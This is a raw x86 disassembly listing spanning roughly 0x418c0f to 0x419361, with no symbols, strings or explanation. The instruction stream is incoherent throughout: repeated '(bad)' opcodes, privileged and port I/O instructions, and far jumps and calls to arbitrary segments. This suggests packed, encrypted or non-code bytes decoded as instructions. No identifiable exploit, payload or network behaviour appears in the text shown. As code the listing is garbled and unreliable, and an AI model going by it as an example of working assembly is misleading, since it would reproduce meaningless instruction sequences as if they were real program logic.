  418c0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c10:	into   
  418c11:	ds mov cl,0x74
  418c14:	cmp    bl,dh
  418c16:	(bad)  
  418c17:	pop    eax
  418c18:	inc    esi
  418c19:	push   edi
  418c1a:	outs   dx,BYTE PTR ds:[esi]
  418c1b:	sbb    bl,BYTE PTR [ebp+eiz*2-0x37]
  418c1f:	mov    bl,0xcd
  418c21:	shl    DWORD PTR [ebx],0x45
  418c24:	add    bh,BYTE PTR [esi]
  418c26:	(bad)  
  418c27:	out    dx,al
  418c28:	gs jb  0x418c4a
  418c2b:	aad    0x73
  418c2d:	mov    ch,0x20
  418c2f:	xchg   ebp,eax
  418c30:	dec    esi
  418c31:	adc    DWORD PTR [ebp+eiz*2-0x2e],ecx
  418c35:	icebp  
  418c36:	jb     0x418c28
  418c38:	das    
  418c39:	sub    al,0x85
  418c3b:	and    BYTE PTR [esi],ah
  418c3d:	sbb    DWORD PTR [esi+0x17dc4c6f],0x16
  418c44:	inc    BYTE PTR [ebp+eax*1+0x7d6cf619]
  418c4b:	dec    ebx
  418c4c:	in     al,dx
  418c4d:	lods   al,BYTE PTR ds:[esi]
  418c4e:	inc    eax
  418c4f:	int    0x88
  418c51:	inc    edx
  418c52:	sub    eax,0xba4dc94f
  418c57:	cmp    al,0x96
  418c59:	shl    DWORD PTR [ebp+0x3b],1
  418c5c:	cwde   
  418c5d:	inc    ebx
  418c5e:	push   es
  418c5f:	xchg   DWORD PTR [eax+0x51],ebx
  418c62:	repnz outs dx,DWORD PTR ds:[esi]
  418c64:	sub    DWORD PTR [esi],edi
  418c66:	call   0xea9:0x6b099617
  418c6d:	shl    bl,cl
  418c6f:	loope  0x418c33
  418c71:	aad    0x34
  418c73:	push   edx
  418c74:	pop    ecx
  418c75:	mov    ah,0xed
  418c77:	test   ebp,eax
  418c79:	push   esp
  418c7a:	or     cl,BYTE PTR [edi+0x10]
  418c7d:	or     al,0xae
  418c7f:	lea    eax,[ebx-0x762b462f]
  418c85:	and    BYTE PTR [eax],al
  418c87:	aad    0x87
  418c89:	pop    ds
  418c8a:	xchg   esi,eax
  418c8b:	mov    eax,0x5eed1777
  418c90:	popf   
  418c91:	xor    DWORD PTR [edi],eax
  418c93:	add    DWORD PTR [eax-0x7a],esp
  418c96:	ins    BYTE PTR es:[edi],dx
  418c97:	jl     0x418c58
  418c99:	lahf   
  418c9a:	jnp    0x418ce4
  418c9c:	cmp    cl,dh
  418c9e:	faddp  st(3),st
  418ca0:	shr    BYTE PTR [eax-0x59],cl
  418ca3:	test   BYTE PTR [ebx+0x73],ah
  418ca6:	add    eax,0x5f563f9a
  418cab:	jnp    0x418d17
  418cad:	or     al,0xc5
  418caf:	pop    esi
  418cb0:	lods   eax,DWORD PTR ds:[esi]
  418cb1:	mov    dl,0x6a
  418cb3:	jb     0x418c41
  418cb5:	and    ecx,edi
  418cb7:	and    eax,0x30e64683
  418cbc:	test   eax,0xf0cacc37
  418cc1:	jecxz  0x418c67
  418cc3:	push   ebx
  418cc4:	jg     0x418d12
  418cc6:	or     ecx,0x3c2144da
  418ccc:	movsx  ecx,si
  418ccf:	push   0xb8457b6f
  418cd4:	aaa    
  418cd5:	push   ds
  418cd6:	xchg   edi,eax
  418cd7:	dec    ebx
  418cd8:	add    bh,cl
  418cda:	scas   al,BYTE PTR es:[edi]
  418cdb:	xchg   DWORD PTR [edx-0x5f],edx
  418cde:	ret    
  418cdf:	fstp   DWORD PTR [ecx+0x18c6b36f]
  418ce5:	inc    edi
  418ce6:	inc    esp
  418ce7:	pop    eax
  418ce8:	(bad)  
  418ce9:	fsubr  DWORD PTR [edx]
  418ceb:	and    eax,0xc97a90c0
  418cf0:	mov    bl,0x30
  418cf2:	xor    edx,ecx
  418cf4:	fisub  WORD PTR [ecx+0x5e14a166]
  418cfa:	add    bh,BYTE PTR [esi]
  418cfc:	(bad)  
  418cfd:	fld    st(1)
  418cff:	xchg   esi,eax
  418d00:	enter  0xcd6b,0xeb
  418d04:	int3   
  418d05:	lods   al,BYTE PTR ds:[esi]
  418d06:	or     DWORD PTR [ecx+ecx*8-0x1e],0xffffffea
  418d0b:	jl     0x418cb8
  418d0d:	jmp    0x306f:0x4ad48353
  418d14:	xchg   ecx,eax
  418d15:	xchg   ecx,eax
  418d16:	cwde   
  418d17:	lods   eax,DWORD PTR ds:[esi]
  418d18:	fdiv   QWORD PTR cs:[ebx-0x5a]
  418d1c:	sub    di,WORD PTR [ebx]
  418d1f:	test   al,0xfa
  418d21:	push   ebx
  418d22:	addr16 push edx
  418d24:	adc    ah,BYTE PTR gs:[ecx]
  418d27:	xchg   edi,eax
  418d28:	inc    ecx
  418d29:	jb     0x418d38
  418d2b:	(bad)  
  418d2c:	push   ds
  418d2d:	stos   BYTE PTR es:[edi],al
  418d2e:	mov    ebx,0x7a0ef03c
  418d33:	cmp    BYTE PTR [eax],0x44
  418d36:	jno    0x418d0e
  418d38:	les    edi,FWORD PTR [ebx]
  418d3a:	popf   
  418d3b:	rcl    ebp,0xa2
  418d3e:	jne    0x418d35
  418d40:	dec    ecx
  418d41:	cmp    BYTE PTR [ebx],cl
  418d43:	fdivr  st(6),st
  418d45:	int    0x83
  418d47:	push   esi
  418d48:	cwde   
  418d49:	push   esp
  418d4a:	test   al,0x2a
  418d4c:	jns    0x418d63
  418d4e:	fistp  WORD PTR [edx]
  418d50:	fnstcw WORD PTR [esi-0x47366f4b]
  418d56:	aad    0xfe
  418d58:	mov    ecx,0x13bb82b5
  418d5d:	mov    al,BYTE PTR [esi-0x7686a2a8]
  418d63:	sub    BYTE PTR [edi-0x357917ea],al
  418d69:	rol    DWORD PTR [ebp-0x76],cl
  418d6c:	sub    eax,0x4cdb5356
  418d71:	out    dx,eax
  418d72:	pop    ebx
  418d73:	jge    0x418da0
  418d75:	scas   al,BYTE PTR es:[edi]
  418d76:	fs leavew 
  418d79:	pop    ds
  418d7a:	pop    es
  418d7b:	sbb    al,ah
  418d7d:	add    eax,0xd6392240
  418d82:	jae    0x418db7
  418d84:	cwde   
  418d85:	mov    ebp,0x2ac1bd27
  418d8a:	add    BYTE PTR [edx-0x5c],bh
  418d8d:	add    DWORD PTR ds:0xf0381c8,ebp
  418d93:	cwde   
  418d94:	das    
  418d95:	mul    bl
  418d97:	xor    al,0x92
  418d99:	int    0x88
  418d9b:	xor    cl,BYTE PTR [edi]
  418d9d:	xchg   edx,eax
  418d9e:	mov    edx,0xad3eea6d
  418da3:	sub    al,0x3a
  418da5:	jae    0x418d81
  418da7:	mov    edi,0xb92cda44
  418dac:	outs   dx,BYTE PTR ds:[esi]
  418dad:	sbb    ebx,edi
  418daf:	adc    eax,0x8fbf63b4
  418db4:	sbb    BYTE PTR [esi-0x77],dh
  418db7:	jp     0x418da1
  418db9:	mov    cs,WORD PTR [esi+esi*4]
  418dbc:	adc    BYTE PTR [esi+ebx*2+0x703200ee],0xdf
  418dc4:	xlat   BYTE PTR ds:[ebx]
  418dc5:	mov    al,0xf0
  418dc7:	rcl    BYTE PTR [ebx+0x7b],1
  418dca:	jecxz  0x418d55
  418dcc:	pop    esi
  418dcd:	cmp    esp,DWORD PTR [esi]
  418dcf:	pop    esi
  418dd0:	pop    eax
  418dd1:	sbb    esi,edi
  418dd3:	ret    
  418dd4:	call   FWORD PTR [eax+0xdddabd]
  418dda:	in     eax,0x8c
  418ddc:	dec    esp
  418ddd:	lock (bad) 
  418ddf:	ja     0x418e5b
  418de1:	mov    edx,es
  418de3:	mov    ax,0xdd62
  418de7:	adc    edx,esi
  418de9:	jmp    0x971a:0x78fb5e0c
  418df0:	add    BYTE PTR [edi-0x4d106fda],ah
  418df6:	lods   eax,DWORD PTR ds:[esi]
  418df7:	xor    BYTE PTR [edi],al
  418df9:	das    
  418dfa:	in     al,dx
  418dfb:	(bad)  
  418dfc:	inc    esi
  418dfd:	cmp    dh,ch
  418dff:	pop    ecx
  418e00:	sbb    al,0xe0
  418e02:	add    eax,0xec20ac73
  418e07:	icebp  
  418e08:	pop    ss
  418e09:	pop    ds
  418e0a:	jecxz  0x418e0f
  418e0c:	xor    eax,DWORD PTR [esi-0x60]
  418e0f:	gs adc al,0xbf
  418e12:	jnp    0x418e2d
  418e14:	out    dx,eax
  418e15:	sahf   
  418e16:	test   al,0x2b
  418e18:	xchg   edi,eax
  418e19:	ins    BYTE PTR es:[edi],dx
  418e1a:	add    eax,DWORD PTR [eax]
  418e1c:	xchg   esp,eax
  418e1d:	pop    es
  418e1e:	es sbb al,0x3b
  418e21:	push   ecx
  418e22:	dec    esi
  418e23:	cli    
  418e24:	push   edi
  418e25:	aad    0x6
  418e27:	(bad)  
  418e29:	adc    BYTE PTR [ecx],dl
  418e2b:	dec    ecx
  418e2c:	aam    0xb0
  418e2e:	(bad)  
  418e2f:	(bad)  
  418e30:	ror    al,cl
  418e32:	or     al,0x28
  418e34:	push   0xffffffde
  418e36:	or     ch,BYTE PTR [edx-0x5334fd9d]
  418e3c:	pusha  
  418e3d:	mov    esp,0x4fd7d57e
  418e42:	jbe    0x418dcf
  418e44:	pop    esi
  418e45:	xlat   BYTE PTR ds:[ebx]
  418e46:	iret   
  418e47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e48:	(bad)  
  418e49:	int    0xf7
  418e4b:	push   0xa5b55774
  418e50:	sub    eax,0xaa03444b
  418e55:	(bad)  
  418e56:	test   eax,0xc20457a3
  418e5b:	mov    al,0x88
  418e5d:	inc    edi
  418e5e:	push   eax
  418e5f:	lahf   
  418e60:	pop    eax
  418e61:	fstp   DWORD PTR [eax]
  418e63:	stos   DWORD PTR es:[edi],eax
  418e64:	jns    0x418eb7
  418e66:	mov    bh,0xe8
  418e68:	add    ecx,DWORD PTR [edx-0x3c]
  418e6b:	stos   DWORD PTR es:[edi],eax
  418e6c:	stos   DWORD PTR es:[edi],eax
  418e6d:	test   eax,0x356ebc11
  418e72:	out    dx,al
  418e73:	cmp    eax,0xf313de4f
  418e78:	sbb    DWORD PTR [ebx-0x3e0e0d31],ebp
  418e7e:	loop   0x418e16
  418e80:	mov    ebx,0xa237031a
  418e85:	fs bswap ebp
  418e88:	sbb    ah,BYTE PTR [ecx+0xe22c6ec]
  418e8e:	mov    ebp,0x9f198600
  418e93:	pusha  
  418e94:	pop    edx
  418e95:	pop    ds
  418e96:	fwait
  418e97:	aas    
  418e98:	push   ecx
  418e99:	outs   dx,BYTE PTR ds:[esi]
  418e9a:	pop    eax
  418e9b:	inc    esi
  418e9c:	cmp    bl,al
  418e9e:	inc    ecx
  418e9f:	fist   DWORD PTR [eax]
  418ea1:	or     ecx,esp
  418ea3:	scas   eax,DWORD PTR es:[edi]
  418ea4:	jmp    0x6c3a:0xd63a62f2
  418eab:	inc    ebp
  418eac:	repz aad 0xc5
  418eaf:	push   ebx
  418eb0:	pop    esp
  418eb1:	out    0x7,al
  418eb3:	sub    DWORD PTR [eax],ecx
  418eb5:	out    dx,eax
  418eb6:	or     BYTE PTR [edi-0x1d],cl
  418eb9:	js     0x418e7d
  418ebb:	adc    eax,0x961764ca
  418ec0:	lds    ebx,FWORD PTR [esi+0x2e5557f2]
  418ec6:	add    DWORD PTR [eax+0x315f4fc0],edx
  418ecc:	mov    BYTE PTR [edx],cl
  418ece:	out    0x6,eax
  418ed0:	cwde   
  418ed1:	test   DWORD PTR [edi+esi*2-0x1a],esi
  418ed5:	sub    edx,DWORD PTR [esi]
  418ed7:	xchg   ebx,eax
  418ed8:	xchg   DWORD PTR [ecx+0x66897e8a],edx
  418ede:	repz and eax,0xb93efc42
  418ee4:	fimul  WORD PTR [edi]
  418ee6:	rcr    WORD PTR [ecx+ebp*8+0x2f],cl
  418eeb:	adc    eax,0xae0e0a84
  418ef0:	sbb    ebx,DWORD PTR [ecx]
  418ef2:	pop    edx
  418ef3:	cmp    ch,ch
  418ef5:	mov    edi,cs
  418ef7:	ret    0x28e
  418efa:	out    dx,al
  418efb:	adc    eax,0x29de418
  418f00:	mov    edi,0xa7e7226
  418f05:	jnp    0x418f38
  418f07:	(bad)  
  418f08:	cmp    esp,DWORD PTR [ecx+edx*4]
  418f0b:	int    0x16
  418f0d:	sbb    DWORD PTR [ecx+0x58],esi
  418f10:	xchg   esi,eax
  418f11:	test   al,0xd9
  418f13:	loop   0x418ea6
  418f15:	test   ah,ch
  418f17:	pushf  
  418f18:	pop    ebx
  418f19:	pop    eax
  418f1a:	cld    
  418f1b:	(bad)  
  418f1c:	cmp    edx,DWORD PTR [eax+eax*4+0x6a]
  418f20:	gs jb  0x418ec4
  418f23:	loop   0x418ea5
  418f25:	adc    dl,bl
  418f27:	retf   0xf84
  418f2a:	in     al,dx
  418f2b:	jnp    0x418f9a
  418f2d:	adc    dl,BYTE PTR [edi+ebx*4-0x9bd8bd1]
  418f34:	cmp    eax,DWORD PTR [ecx+0x398e70d2]
  418f3a:	and    edx,edx
  418f3c:	ds ja  0x418f99
  418f3f:	cli    
  418f40:	fdivp  st(5),st
  418f42:	mov    ecx,0x864bbc6f
  418f47:	mov    al,0x91
  418f49:	pop    ebx
  418f4a:	lea    esp,[ebp-0x1]
  418f4d:	xor    DWORD PTR [edx],esp
  418f4f:	enter  0xc3b8,0xba
  418f53:	xlat   BYTE PTR ds:[ebx]
  418f54:	inc    esi
  418f55:	jecxz  0x418f2e
  418f57:	rol    DWORD PTR [ebx+0xc71c3a8],1
  418f5d:	xchg   ebx,eax
  418f5e:	xor    ebp,DWORD PTR [eax-0x29d8e5c5]
  418f64:	ja     0x418f69
  418f66:	icebp  
  418f67:	scas   eax,DWORD PTR es:[edi]
  418f68:	iret   
  418f69:	lock lods eax,DWORD PTR ds:[esi]
  418f6b:	sub    esi,DWORD PTR [esi-0x6e]
  418f6e:	loope  0x418fd8
  418f70:	add    BYTE PTR [eax],al
  418f72:	mov    ah,0x18
  418f74:	addr16 cdq 
  418f76:	jmp    0x418f2b
  418f78:	sub    al,0x96
  418f7a:	xchg   ebx,eax
  418f7b:	(bad)
  418f7e:	mov    bh,0xa9
  418f80:	cmp    al,0x32
  418f82:	push   ds
  418f83:	lds    ebx,FWORD PTR [eax+0x71]
  418f86:	lock adc DWORD PTR gs:[ebx+0x19],eax
  418f8b:	push   ss
  418f8c:	inc    eax
  418f8d:	int3   
  418f8e:	sbb    al,0xf7
  418f90:	mov    esp,0xaf7907f
  418f95:	lock lea edx,[edi+0x7f]
  418f99:	mov    edi,DWORD PTR [eax]
  418f9b:	dec    edi
  418f9c:	retf   0xa3cb
  418f9f:	enter  0x5a3e,0x3e
  418fa3:	iret   
  418fa4:	mov    ebp,0x1fc114d
  418fa9:	ret    
  418faa:	jb     0x419010
  418fac:	ret    
  418fad:	mov    ds,ebx
  418faf:	mov    cl,0xad
  418fb1:	dec    eax
  418fb2:	mov    cl,BYTE PTR [ebp+esi*2-0x7c]
  418fb6:	ins    BYTE PTR es:[edi],dx
  418fb7:	xchg   ebx,eax
  418fb8:	add    bl,ch
  418fba:	stos   BYTE PTR es:[edi],al
  418fbb:	adc    al,0x39
  418fbd:	pop    esp
  418fbe:	sbb    bh,BYTE PTR [edx]
  418fc0:	xlat   BYTE PTR ds:[ebx]
  418fc1:	mul    DWORD PTR [edx+eax*4+0x33]
  418fc5:	neg    BYTE PTR [ebx-0x4]
  418fc8:	xchg   ebx,eax
  418fc9:	les    edi,FWORD PTR [esi-0x5dfcd326]
  418fcf:	test   DWORD PTR [ecx+0x1],eax
  418fd2:	sub    DWORD PTR [esi-0x3721ac32],ebx
  418fd8:	pop    es
  418fd9:	sbb    BYTE PTR [edi+ebp*2-0x7bb51ff9],dl
  418fe0:	push   0x4e
  418fe2:	jg     0x41903b
  418fe4:	inc    edx
  418fe5:	jnp    0x419058
  418fe7:	mov    eax,0x7ce10b8f
  418fed:	fs mov al,0xe3
  418ff0:	repz cmp edi,DWORD PTR [ebx]
  418ff3:	jmp    0x3aa62a73
  418ff8:	add    eax,0x25863dc1
  418ffd:	xchg   ebx,eax
  418ffe:	mov    edx,0x7623ada0
  419003:	pusha  
  419004:	pop    es
  419005:	adc    BYTE PTR [edi],dh
  419007:	jecxz  0x418fba
  419009:	mov    al,ds:0xf9f6d2ec
  41900e:	sar    cl,0x20
  419011:	dec    esi
  419012:	retf   
  419013:	sbb    al,BYTE PTR [eax-0x7ef1f03a]
  419019:	pop    esp
  41901a:	mul    BYTE PTR [ebx-0x58]
  41901d:	ins    BYTE PTR es:[edi],dx
  41901e:	mov    eax,0xc171f11e
  419023:	fwait
  419024:	mov    BYTE PTR [ecx+0x5d],dh
  419027:	cmp    ah,BYTE PTR [ebx+ebp*2+0x79]
  41902b:	call   FWORD PTR [ecx]
  41902d:	mov    eax,ds:0x865935a3
  419032:	scas   eax,DWORD PTR es:[edi]
  419033:	sbb    BYTE PTR [esi+ebx*1],ah
  419036:	mov    es,WORD PTR [ecx+esi*8-0x2a]
  41903a:	or     eax,0xb24ec639
  41903f:	in     al,0xf2
  419041:	dec    ebx
  419042:	push   eax
  419043:	loopne 0x41901f
  419045:	ret    0x9cf1
  419048:	push   esp
  419049:	inc    edi
  41904a:	mov    eax,ds:0x954e90b3
  41904f:	dec    ebx
  419050:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419051:	pusha  
  419052:	mov    eax,0xe4070a1b
  419057:	outs   dx,DWORD PTR ds:[esi]
  419058:	leave  
  419059:	mov    dl,0xd2
  41905b:	retf   
  41905c:	(bad)  
  41905e:	sbb    ecx,DWORD PTR [ebp+edx*1+0x69de4213]
  419065:	enter  0xc87f,0x85
  419069:	inc    ebp
  41906a:	dec    esi
  41906b:	cmp    al,0x3d
  41906d:	push   esp
  41906e:	sbb    eax,0x1a2759ae
  419073:	enter  0xf888,0xf4
  419077:	fist   DWORD PTR [ecx+edi*1-0x58]
  41907b:	push   ebp
  41907c:	sub    al,0x62
  41907e:	mov    ecx,0x51d6ba9b
  419083:	mov    ds:0xd9bf1504,eax
  419088:	dec    esp
  419089:	and    BYTE PTR [edi],ah
  41908b:	push   ebp
  41908c:	cmp    BYTE PTR [esi+0x73a9a67f],dh
  419092:	icebp  
  419093:	mov    esp,0x73f2d948
  419098:	int    0x67
  41909a:	(bad)  
  41909b:	jns    0x41903e
  41909d:	push   edx
  41909e:	scas   eax,DWORD PTR es:[edi]
  41909f:	sbb    al,0x7e
  4190a1:	sbb    eax,0x4e613b3b
  4190a6:	mov    DWORD PTR [edi-0x6963aa2f],ebp
  4190ac:	xchg   edx,eax
  4190ad:	icebp  
  4190ae:	add    cl,BYTE PTR [ebx-0x7ed1f184]
  4190b4:	inc    ebp
  4190b5:	lahf   
  4190b6:	inc    edx
  4190b7:	jnp    0x419109
  4190b9:	sar    eax,0x9f
  4190bc:	xor    BYTE PTR [eax-0x173be29a],ah
  4190c2:	sbb    edi,DWORD PTR [esi]
  4190c4:	adc    DWORD PTR [eax],esi
  4190c6:	lahf   
  4190c7:	js     0x4190fc
  4190c9:	pop    ecx
  4190ca:	retf   0x8fd5
  4190cd:	mov    eax,0xe88da976
  4190d2:	inc    eax
  4190d3:	cmp    esi,esi
  4190d5:	jge    0x419135
  4190d7:	hlt    
  4190d8:	inc    ebp
  4190d9:	jno    0x419143
  4190db:	push   0xfcb9f3f0
  4190e0:	push   0x429dd4be
  4190e5:	(bad)  
  4190e7:	sbb    eax,0x3a9ad6b0
  4190ec:	dec    esi
  4190ed:	cmp    BYTE PTR [ecx+ebp*8],ah
  4190f0:	jmp    0x8357:0xa549d003
  4190f7:	and    DWORD PTR [esi],ebx
  4190f9:	ins    DWORD PTR es:[edi],dx
  4190fa:	mov    eax,ds:0xb0f95123
  4190ff:	not    BYTE PTR ds:0xec78c959
  419105:	pop    es
  419106:	shl    DWORD PTR [ebx+0x43],1
  419109:	repnz ins BYTE PTR es:[edi],dx
  41910b:	cli    
  41910c:	add    BYTE PTR [ebp+0x6d],ch
  41910f:	sahf   
  419110:	mov    fs,WORD PTR [ecx]
  419112:	test   BYTE PTR [edx+0x39],ch
  419115:	xor    al,0x2f
  419117:	rsqrtps xmm4,xmm5
  41911a:	dec    edi
  41911b:	add    esp,esi
  41911d:	pop    edi
  41911e:	int3   
  41911f:	lods   al,BYTE PTR ds:[esi]
  419120:	inc    edx
  419121:	inc    edx
  419122:	mov    bl,bl
  419124:	dec    esi
  419125:	data16 sar BYTE PTR [ebp-0x10928580],cl
  41912c:	aas    
  41912d:	mov    ebp,edx
  41912f:	js     0x419195
  419131:	push   0x5b
  419133:	lock sub eax,0x83ebb113
  419139:	or     ebp,DWORD PTR cs:[esi+edx*2+0x3e]
  41913e:	repz in eax,0x29
  419141:	adc    al,0x3
  419143:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419144:	mov    cl,0x31
  419146:	test   al,0x14
  419148:	das    
  419149:	jne    0x419169
  41914b:	dec    esp
  41914c:	inc    ebx
  41914d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41914e:	xor    ch,al
  419150:	sub    BYTE PTR [edi+0x4c3bb2ea],ch
  419156:	xchg   BYTE PTR [esi+eiz*4],bl
  419159:	int3   
  41915a:	outs   dx,DWORD PTR ds:[esi]
  41915b:	enter  0xb160,0x72
  41915f:	stos   BYTE PTR es:[edi],al
  419160:	jbe    0x4190ee
  419162:	mov    ebx,0x4f97e335
  419167:	and    BYTE PTR [edi-0x4d390b95],bh
  41916d:	in     eax,dx
  41916e:	xchg   edi,eax
  41916f:	mov    DWORD PTR [edx+0x20460c24],esp
  419175:	cmp    BYTE PTR [ebx+0x4dd638ec],ah
  41917b:	push   esp
  41917c:	jle    0x4191ca
  41917e:	add    eax,0xae394bbf
  419183:	push   esi
  419184:	pop    eax
  419185:	jge    0x4191bc
  419187:	sub    al,0x77
  419189:	test   al,0x40
  41918b:	inc    edi
  41918c:	adc    ecx,DWORD PTR [eax+0x7c]
  41918f:	psraw  mm4,mm2
  419192:	fstp   TBYTE PTR [edx]
  419194:	xor    ch,0x1b
  419197:	in     eax,dx
  419198:	clc    
  419199:	xchg   ebx,eax
  41919a:	adc    BYTE PTR [edx+0x34a6bbfb],bh
  4191a0:	adc    al,0xd3
  4191a2:	ja     0x419151
  4191a4:	aad    0xff
  4191a6:	add    bl,BYTE PTR [edx*1+0x24a367cc]
  4191ad:	fbld   TBYTE PTR [esi]
  4191af:	int3   
  4191b0:	push   edx
  4191b1:	inc    BYTE PTR [ecx]
  4191b3:	fucom  st(4)
  4191b5:	lock inc esp
  4191b7:	fwait
  4191b8:	adc    ebp,0x52
  4191bb:	enter  0x3757,0x8d
  4191bf:	(bad)  
  4191c0:	fsubr  QWORD PTR [edx+0x5a]
  4191c3:	mov    al,ds:0x809cbe68
  4191c8:	retf   
  4191c9:	shl    BYTE PTR [ecx+eiz*8-0x2b],cl
  4191cd:	aas    
  4191ce:	mov    ss,esp
  4191d0:	retf   
  4191d1:	in     eax,dx
  4191d2:	adc    al,0x8d
  4191d4:	or     al,0x97
  4191d6:	ror    BYTE PTR [edi],1
  4191d8:	mov    cl,0x1c
  4191da:	pop    esi
  4191db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4191dc:	stos   DWORD PTR es:[edi],eax
  4191dd:	inc    edx
  4191de:	imul   ecx,DWORD PTR ds:0x15e65d4,0xffffffd9
  4191e5:	mov    DWORD PTR [ecx],ecx
  4191e7:	dec    esp
  4191e8:	fidiv  WORD PTR [eax-0x6b]
  4191eb:	lock xchg esi,eax
  4191ed:	pop    ss
  4191ee:	outs   dx,DWORD PTR ds:[esi]
  4191ef:	cmp    ebx,ebx
  4191f1:	pop    esi
  4191f2:	ins    DWORD PTR es:[edi],dx
  4191f3:	cld    
  4191f4:	push   es
  4191f5:	out    dx,eax
  4191f6:	cs push cs
  4191f8:	jno    0x41923d
  4191fa:	cwde   
  4191fb:	xchg   esp,eax
  4191fc:	push   edi
  4191fd:	mov    cl,0x56
  4191ff:	shl    DWORD PTR [ebp+0x7c],1
  419202:	push   cs
  419203:	(bad)  
  419205:	das    
  419206:	push   edi
  419207:	ins    BYTE PTR es:[edi],dx
  419208:	popa   
  419209:	outs   dx,DWORD PTR ds:[esi]
  41920a:	js     0x419211
  41920c:	sbb    BYTE PTR [ecx],0x76
  41920f:	fimul  WORD PTR [edx]
  419211:	aam    0xb7
  419213:	ret    0xb7b7
  419216:	bound  eax,QWORD PTR [ebp-0x2b]
  419219:	add    ebp,edi
  41921b:	cmp    DWORD PTR [esi+ebp*1-0x66],edx
  41921f:	mov    cl,BYTE PTR [ebx+0xf]
  419222:	xor    DWORD PTR [edi-0x5968fc7c],ecx
  419228:	jb     0x419254
  41922a:	mov    eax,0xcc64da80
  41922f:	sbb    al,0x39
  419231:	xchg   ebp,eax
  419232:	xor    bl,ah
  419234:	and    al,0x6a
  419236:	jne    0x4191d4
  419238:	pushf  
  419239:	in     al,dx
  41923a:	push   ds
  41923b:	lods   eax,DWORD PTR ds:[esi]
  41923c:	cli    
  41923d:	hlt    
  41923e:	out    0x4,al
  419240:	out    dx,al
  419241:	stc    
  419242:	hlt    
  419243:	lahf   
  419244:	pushf  
  419245:	fidivr DWORD PTR [ebp+0x52]
  419248:	mov    al,ds:0x970cf386
  41924d:	ja     0x4192c4
  41924f:	jle    0x419271
  419251:	sbb    esi,esp
  419253:	imul   ebx,DWORD PTR [esi+0x2e],0xc53a66a0
  41925a:	push   edi
  41925b:	repz mov ecx,0xf7f875f6
  419261:	sti    
  419262:	add    al,0xe2
  419264:	sub    eax,DWORD PTR [edx-0x4c]
  419267:	inc    esi
  419268:	call   0x208942c8
  41926d:	lahf   
  41926e:	fucomp st(1)
  419270:	jnp    0x4192dd
  419272:	lods   eax,DWORD PTR ds:[esi]
  419273:	scas   eax,DWORD PTR es:[edi]
  419274:	dec    eax
  419275:	jne    0x41921a
  419277:	aad    0x6f
  419279:	or     esi,DWORD PTR [edi+0x1079f6ed]
  41927f:	test   BYTE PTR [ebx],cl
  419281:	(bad)  
  419283:	cmp    ebp,edi
  419285:	jg     0x4192cc
  419287:	jae    0x4192b1
  419289:	push   edx
  41928a:	scas   eax,DWORD PTR es:[edi]
  41928b:	sub    bl,bl
  41928d:	loop   0x4192d4
  41928f:	(bad)  
  419290:	pop    ss
  419291:	jmp    0x4192ed
  419293:	shl    ch,0x9b
  419296:	sbb    eax,DWORD PTR [edi]
  419298:	outs   dx,BYTE PTR ds:[esi]
  419299:	leave  
  41929a:	in     eax,dx
  41929b:	stc    
  41929c:	pusha  
  41929d:	add    dl,BYTE PTR [ebx-0x609c916]
  4192a3:	stos   DWORD PTR es:[edi],eax
  4192a4:	inc    esi
  4192a5:	pop    edi
  4192a6:	pop    ss
  4192a7:	popa   
  4192a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4192a9:	imul   ebp,DWORD PTR ds:0x3a7354bc,0x52
  4192b0:	and    eax,0xb858bb32
  4192b5:	push   DWORD PTR [ebx+0x6e]
  4192b8:	(bad)  
  4192b9:	push   esp
  4192ba:	jno    0x419301
  4192bc:	mov    esp,0x3711e4ed
  4192c1:	outs   dx,DWORD PTR ds:[esi]
  4192c2:	scas   eax,DWORD PTR es:[edi]
  4192c3:	fwait
  4192c4:	add    cl,bh
  4192c6:	fsubrp st(1),st
  4192c9:	sbb    BYTE PTR [eax-0x6b34316d],bl
  4192cf:	jmp    0x41926a
  4192d1:	fst    QWORD PTR [esi]
  4192d3:	je     0x41934d
  4192d5:	dec    ebx
  4192d6:	call   0x6ea1:0xeebfccd7
  4192dd:	push   cs
  4192de:	repz xlat BYTE PTR ds:[ebx]
  4192e0:	hlt    
  4192e1:	loope  0x419319
  4192e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4192e4:	adc    dl,dh
  4192e6:	outs   dx,DWORD PTR ds:[esi]
  4192e7:	xchg   ebx,eax
  4192e8:	jmp    0xfeab:0xd125ef8d
  4192ef:	and    ebx,DWORD PTR [ecx+eiz*4-0x1dbadd9b]
  4192f6:	outs   dx,BYTE PTR ds:[esi]
  4192f7:	ror    DWORD PTR [eax+0x32],0xe7
  4192fb:	iret   
  4192fc:	pop    edx
  4192fd:	mov    edx,DWORD PTR [ebx-0x71]
  419300:	(bad)  
  419301:	pop    edx
  419302:	cdq    
  419303:	les    esi,FWORD PTR [esi+0x14]
  419306:	mov    dh,0xc2
  419308:	popa   
  419309:	jge    0x4192f3
  41930b:	mov    cl,0x81
  41930d:	lea    edx,[eax]
  41930f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419310:	(bad)  
  419311:	xor    BYTE PTR [edx+0x2c],al
  419314:	mov    WORD PTR [edi-0x70588c62],?
  41931a:	sar    DWORD PTR [esi+eiz*1],cl
  41931d:	fnstsw WORD PTR [edx]
  41931f:	hlt    
  419320:	fstp   DWORD PTR [edx+0x19a5d5ca]
  419326:	out    0xbd,eax
  419328:	add    eax,0xb0bcb94a
  41932d:	adc    BYTE PTR [ecx],0x57
  419330:	add    bl,BYTE PTR [ebp+0x64]
  419333:	retf   
  419334:	loop   0x41935b
  419336:	push   cs
  419337:	pushf  
  419338:	xchg   ebx,eax
  419339:	imul   esp,DWORD PTR [edx],0x37
  41933c:	les    eax,FWORD PTR [ecx+edi*4+0x6f79dd7c]
  419343:	sar    ch,1
  419345:	gs hlt 
  419347:	fldl2t 
  419349:	xor    al,0x88
  41934b:	inc    eax
  41934c:	repnz sub eax,0x534bb511
  419352:	sar    BYTE PTR [eax],cl
  419354:	mov    edi,0x622373ce
  419359:	(bad)  
  41935a:	fild   DWORD PTR [edi]
  41935c:	sti    
  41935d:	aad    0x4b
  41935f:	jae    0x41930e
  419361:	pop    edi
